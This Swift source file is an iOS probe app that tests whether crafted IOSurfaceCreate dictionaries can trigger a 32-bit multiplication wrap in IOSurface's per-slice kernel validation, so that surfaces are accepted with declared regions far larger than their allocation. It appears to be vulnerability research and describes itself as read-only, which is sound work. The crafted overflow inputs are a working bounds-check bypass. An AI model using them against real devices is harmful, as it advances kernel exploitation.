//
//  ContentView.swift
//  AGXProbe — geometry v4: the gated per-slice path
//
//  Static finding (analysis/f1/GEOMETRY-PROBE-RESULTS.md §5):
//    The whole per-slice validation block in com.apple.iokit.IOSurface is
//    reachable ONLY if the plane dictionary also contains
//      IOSurfacePlaneCompressedTileHeaderRegionOffset
//      IOSurfacePlaneCompressedTileDataRegionOffset
//    Without them, headerPerSlice/dataPerSlice/sliceCount checks are skipped
//    entirely — which is why v2/v3 accepted 0xffffffff.
//
//    Inside that block:
//      w11 = dataPerSlice + headerPerSlice      (32-bit add)
//      w12 = w11 * sliceCount                   (32-bit mul)
//      if (allocSize < w12) reject
//
//    0x40000000 * 4 wraps to 0 in 32 bits. This probe tests whether the
//    wrap is reachable from userspace, and whether the surface is then
//    accepted with a declared region far larger than its allocation.
//
//  SAFETY: read-only. No Metal, no GPU submission, no writes to any surface.
//

import SwiftUI
import Darwin

@main
struct AGXProbeApp: App {
    var body: some Scene { WindowGroup { ContentView() } }
}

struct ContentView: View {
    @StateObject private var vm = GeomViewModel()
    var body: some View {
        VStack(spacing: 12) {
            Text("AGXProbe — geometry v4").font(.headline)
            Text("iPhone18,1 / t8150 / iOS 27.0.1 (24A446)")
                .font(.caption2).foregroundColor(.secondary)
            ScrollView {
                Text(vm.log)
                    .font(.system(size: 9, design: .monospaced))
                    .foregroundColor(.green)
                    .frame(maxWidth: .infinity, alignment: .leading)
                    .padding(6).background(Color.black.opacity(0.85)).cornerRadius(6)
            }
            Button(action: { Task { await vm.runProbe() } }) {
                Text(vm.isRunning ? "Probing…" : "Run geometry probe v4")
                    .font(.headline).foregroundColor(.white)
                    .frame(maxWidth: .infinity).padding(10)
                    .background(vm.isRunning ? Color.gray : Color.blue).cornerRadius(8)
            }.disabled(vm.isRunning)
            Text("Status: \(vm.status)").font(.caption2).foregroundColor(.secondary)
            Spacer(minLength: 0)
        }
        .padding().task { await vm.autoRunIfRequested() }
    }
}

@MainActor
final class GeomViewModel: ObservableObject {
    @Published var log = ""
    @Published var status = "Ready"
    @Published var isRunning = false

    private var didAutoRun = false
    private let PF_BGRA: UInt32 = 0x42475241

    private var logFileURL: URL {
        FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
            .appendingPathComponent("geom4.log")
    }

    private func log(_ m: String) {
        log += m + "\n"; print(m); fflush(stdout)
        try? log.write(to: logFileURL, atomically: true, encoding: .utf8)
    }

    func autoRunIfRequested() async {
        guard !didAutoRun else { return }
        didAutoRun = true
        guard ProcessInfo.processInfo.arguments.contains("--autorun") else { return }
        await runProbe()
    }

    // ------------------------------------------------------------------

    private func attempt(_ tag: String, _ d: [String: Any]) {
        guard let s = IOSurfaceCreate(d as CFDictionary) else {
            log("\(tag): REJECTED"); return
        }
        let alloc = IOSurfaceGetAllocSize(s)
        let base = IOSurfaceGetBaseAddress(s)
        let baseStr = String(format: "0x%llx", UInt64(UInt(bitPattern: base)))
        log(String(format: "%@: OK base=%@ alloc=0x%lx planes=%lu id=%u",
                   tag, baseStr, alloc, IOSurfaceGetPlaneCount(s), IOSurfaceGetID(s)))
    }

    /// Plane dict. `comp` adds the two CompressedTile*RegionOffset keys that
    /// gate the per-slice validation path.
    private func plane(w: Int, h: Int, bpr: Int, offset: Int, size: Int,
                       comp: Bool) -> [String: Any] {
        var p: [String: Any] = [
            "IOSurfacePlaneWidth": w,
            "IOSurfacePlaneHeight": h,
            "IOSurfacePlaneBytesPerRow": bpr,
            "IOSurfacePlaneBytesPerElement": 4,
            "IOSurfacePlaneOffset": offset,
            "IOSurfacePlaneSize": size,
        ]
        if comp {
            p["IOSurfacePlaneCompressedTileHeaderRegionOffset"] = 0
            p["IOSurfacePlaneCompressedTileDataRegionOffset"] = 0x2000
        }
        return p
    }

    private func dict(alloc: Int, planes: [[String: Any]],
                      extra: [String: Any] = [:]) -> [String: Any] {
        var d: [String: Any] = [
            "IOSurfaceWidth": 64, "IOSurfaceHeight": 64,
            "IOSurfaceBytesPerElement": 4, "IOSurfaceBytesPerRow": 256,
            "IOSurfaceAllocSize": alloc, "IOSurfacePixelFormat": PF_BGRA,
            "IOSurfacePlaneInfo": planes,
        ]
        for (k, v) in extra { d[k] = v }
        return d
    }

    // ------------------------------------------------------------------

    func runProbe() async {
        isRunning = true; status = "Running…"; log = ""
        try? "".write(to: logFileURL, atomically: true, encoding: .utf8)

        log("=== AGXProbe geometry v4 === build 24A446 / t8150")
        log("SAFETY: read-only; no Metal, no writes, no cross-object attempt")

        // --- J. does the gating key pair change anything? -------------
        log("\n--- J. control: plane WITHOUT compressed-tile keys ---")
        attempt("J1 no comp keys, sc=4 hdr=0x2000 alloc=0x4000",
                dict(alloc: 0x4000,
                     planes: [plane(w: 64, h: 64, bpr: 256, offset: 0, size: 0x4000, comp: false)],
                     extra: ["IOSurfaceSliceCount": 4,
                             "IOSurfacePlaneHeaderRegionBytesPerSlice": 0x2000]))

        log("\n--- K. plane WITH compressed-tile keys (path should be live) ---")
        attempt("K1 comp keys, no slice keys",
                dict(alloc: 0x4000,
                     planes: [plane(w: 64, h: 64, bpr: 256, offset: 0, size: 0x4000, comp: true)]))

        // Validation-active proof: these SHOULD be rejected if the path runs.
        attempt("K2 comp sc=4 hdr=0x2000 (w12=0x8000 > alloc 0x4000) EXPECT REJECT",
                dict(alloc: 0x4000,
                     planes: [plane(w: 64, h: 64, bpr: 256, offset: 0, size: 0x4000, comp: true)],
                     extra: ["IOSurfaceSliceCount": 4,
                             "IOSurfacePlaneHeaderRegionBytesPerSlice": 0x2000]))
        attempt("K3 comp sc=4 hdr=0x1000 (w12=0x4000 == alloc) EXPECT ACCEPT",
                dict(alloc: 0x4000,
                     planes: [plane(w: 64, h: 64, bpr: 256, offset: 0, size: 0x4000, comp: true)],
                     extra: ["IOSurfaceSliceCount": 4,
                             "IOSurfacePlaneHeaderRegionBytesPerSlice": 0x1000]))
        attempt("K4 comp sc=2 hdr=0x40000000 (w12=0x80000000 > alloc) EXPECT REJECT",
                dict(alloc: 0x10000,
                     planes: [plane(w: 64, h: 64, bpr: 256, offset: 0, size: 0x4000, comp: true)],
                     extra: ["IOSurfaceSliceCount": 2,
                             "IOSurfacePlaneHeaderRegionBytesPerSlice": 0x40000000]))

        // --- L. the 32-bit wrap --------------------------------------
        log("\n--- L. 32-bit wrap tests (hdr*sc wraps to <= alloc) ---")
        attempt("L1 comp sc=4 hdr=0x40000000 (w12=0x1_00000000 -> 0) EXPECT ACCEPT",
                dict(alloc: 0x10000,
                     planes: [plane(w: 64, h: 64, bpr: 256, offset: 0, size: 0x4000, comp: true)],
                     extra: ["IOSurfaceSliceCount": 4,
                             "IOSurfacePlaneHeaderRegionBytesPerSlice": 0x40000000]))
        attempt("L2 comp sc=4 hdr=0x40000001 (w12=4) EXPECT ACCEPT",
                dict(alloc: 0x10000,
                     planes: [plane(w: 64, h: 64, bpr: 256, offset: 0, size: 0x4000, comp: true)],
                     extra: ["IOSurfaceSliceCount": 4,
                             "IOSurfacePlaneHeaderRegionBytesPerSlice": 0x40000001]))
        attempt("L3 comp sc=4 hdr=0x80000000 (w12=0) EXPECT ACCEPT",
                dict(alloc: 0x10000,
                     planes: [plane(w: 64, h: 64, bpr: 256, offset: 0, size: 0x4000, comp: true)],
                     extra: ["IOSurfaceSliceCount": 4,
                             "IOSurfacePlaneHeaderRegionBytesPerSlice": 0x80000000]))
        attempt("L4 comp sc=4 hdr=0xffffffff data=1 (w11=0, w12=0) EXPECT ACCEPT",
                dict(alloc: 0x10000,
                     planes: [plane(w: 64, h: 64, bpr: 256, offset: 0, size: 0x4000, comp: true)],
                     extra: ["IOSurfaceSliceCount": 4,
                             "IOSurfacePlaneHeaderRegionBytesPerSlice": 0xffffffff,
                             "IOSurfacePlaneDataRegionBytesPerSlice": 1]))
        attempt("L5 comp sc=8 hdr=0x20000000 (w12=0) EXPECT ACCEPT",
                dict(alloc: 0x10000,
                     planes: [plane(w: 64, h: 64, bpr: 256, offset: 0, size: 0x4000, comp: true)],
                     extra: ["IOSurfaceSliceCount": 8,
                             "IOSurfacePlaneHeaderRegionBytesPerSlice": 0x20000000]))

        // --- M. does a data-only declaration behave the same? ---------
        log("\n--- M. dataPerSlice interaction ---")
        attempt("M1 comp sc=4 data=0x2000 (w12=0x8000 > alloc) EXPECT REJECT",
                dict(alloc: 0x4000,
                     planes: [plane(w: 64, h: 64, bpr: 256, offset: 0, size: 0x4000, comp: true)],
                     extra: ["IOSurfaceSliceCount": 4,
                             "IOSurfacePlaneDataRegionBytesPerSlice": 0x2000]))
        attempt("M2 comp sc=4 data=0x1000 (w12=0x4000 == alloc) EXPECT ACCEPT",
                dict(alloc: 0x4000,
                     planes: [plane(w: 64, h: 64, bpr: 256, offset: 0, size: 0x4000, comp: true)],
                     extra: ["IOSurfaceSliceCount": 4,
                             "IOSurfacePlaneDataRegionBytesPerSlice": 0x1000]))

        log("\n=== done ===")
        status = "Complete"; isRunning = false
    }
}
